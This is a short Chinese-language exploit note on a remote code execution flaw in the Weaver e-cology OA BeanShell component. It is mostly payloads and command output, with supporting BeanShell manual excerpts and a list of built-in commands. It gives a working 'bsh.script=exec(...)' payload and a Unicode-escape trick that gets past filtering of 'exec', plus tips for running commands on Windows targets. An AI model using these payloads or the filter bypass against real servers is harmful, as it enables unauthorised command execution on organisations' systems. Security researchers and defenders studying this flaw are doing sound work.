# 泛微e-cology OA Beanshell组件远程代码执行

![](./set.jpg)
## Windows
![](./whoami.jpg)
## Linux
![](./linux.jpg)
![](./linux2.png)

## Ps
```
检测目标系统os.name（因为目标系统是windows的话，执行set等命令，需要手动敲cmd.exe /c set）
使用Unicode绕过exec过滤，部分站点
```
## Payload
```
bsh.script=exec('whoami');

>>>>unicode bypass

bsh.script=\u0065\u0078\u0065\u0063("whoami");

```

## Useful BeanShell Commands

```
In the previous example we used a convenient "built-in" BeanShell command called print(), to display values. 

print() does pretty much the same thing as System.out.println() except that it insures that the output always goes to the command line. print() also displays some types of objects (such as arrays) more verbosely than Java would. 

Another related command is show(), which toggles on and off automatic display of the result of every line you type.
```
#### Here are a few other examples of BeanShell commands:
```
source(), run() - Read a bsh script into this interpreter, or run it in a new interpreter
frame() - Display a GUI component in a Frame or JFrame.
load(), save() - Load or save serializable objects to a file.
cd(), cat(), dir(), pwd(), etc. - Unix-like shell commands
exec() - Run a native application
javap() - Print the methods and fields of an object, similar to the output of the Java javap command.
setAccessibility() - Turn on unrestricted access to private and protected components.
```
## bsh-2.0b4.jar command
`/Users/ale/Desktop/bsh/weaver/WEB-INF/lib/bsh/commands`

```
.//object.bsh
.//rm.bsh
.//run.bsh
.//print.bsh
.//pwd.bsh
.//error.bsh
.//cat.bsh
.//setClassPath.bsh
.//setAccessibility.bsh
.//exec.bsh
.//setFont.bsh
.//dirname.bsh
.//exit.bsh
.//source.bsh
.//frame.bsh
.//cp.bsh
.//printBanner.bsh
.//browseClass.bsh
.//cd.bsh
.//which.bsh
.//setNameSpace.bsh
.//workspaceEditor.bsh
.//thinBorder.bsh
.//bind.bsh
.//bg.bsh
.//save.bsh
.//fontMenu.bsh
.//getSourceFileInfo.bsh
.//classBrowser.bsh
.//load.bsh
.//javap.bsh
.//addClassPath.bsh
.//server.bsh
.//desktop.bsh
.//importCommands.bsh
.//mv.bsh
.//setStrictJava.bsh
.//eval.bsh
.//dir.class
.//getBshPrompt.bsh
.//unset.bsh
.//show.bsh
.//getResource.bsh
.//reloadClasses.bsh
.//clear.bsh
.//getClass.bsh
.//makeWorkspace.bsh
.//importObject.bsh
.//sourceRelative.bsh
.//getClassPath.bsh
.//pathToFile.bsh
.//setNameCompletion.bsh
.//editor.bsh
.//extend.bsh
.//debug.bsh
```

## for Example : eval.bsh

```
a=5;
eval("b=a*2");
print(b);

>>>
10
```
![](./eval.png)
## 参考链接：

http://www.beanshell.org/manual/bshmanual.html#Executable_scripts_under_Unix

https://mp.weixin.qq.com/s/Hr6fSOaPcTp2YaD-fPMxyg



